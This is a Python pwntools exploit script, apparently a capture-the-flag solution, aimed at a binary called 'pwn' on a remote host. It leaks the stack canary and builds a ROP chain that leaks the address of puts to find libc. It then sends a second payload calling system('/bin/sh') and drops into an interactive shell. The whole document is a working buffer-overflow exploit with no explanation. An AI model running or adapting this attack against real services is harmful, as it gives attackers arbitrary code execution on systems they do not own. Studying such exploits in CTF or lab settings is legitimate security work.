from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
    
else:
    host = "192.168.0.111:9395"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # r = gdb.debug("./pwn",'b vuln')
    gdb.attach(r,'b vuln')
    pause()
    pass
   
elf = ELF('./pwn')
r.send(b'A'*73)
r.recvuntil(b'A'*72)
pop_rdi = 0x0000000000401343
canary =  u64(r.recvuntil(b',right?')[:8].ljust(8,b'\x00')) - ord('A')
print(f'canary first = {hex(canary)}')
payload = b'A' * 72 + p64(canary) + b'junkjunk'+ p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['vuln'])
r.send(payload)

addr = r.recvuntil('\x7f')[-6:].ljust(8,b'\x00')
puts_addr = u64(addr)
info(f'puts_addr -> {hex(puts_addr)}')
libc = LibcSearcher('puts',puts_addr)
offser = puts_addr - libc.dump('puts')
binsh = offser + libc.dump('str_bin_sh')
system = offser + libc.dump('system')

r.send(b'A'*73)
r.recvuntil(b'A'*72)
pop_rdi = 0x0000000000401343
canary =  u64(r.recvuntil(b',right?')[:8].ljust(8,b'\x00')) - ord('A')
print(f'canary second = {hex(canary)}')


paylod = b'A' * 72 + p64(canary) + b'junkjunk'+ p64(pop_rdi) + p64(binsh) + p64(0x000000000040101a)+p64(system)
r.send(paylod)
r.interactive()


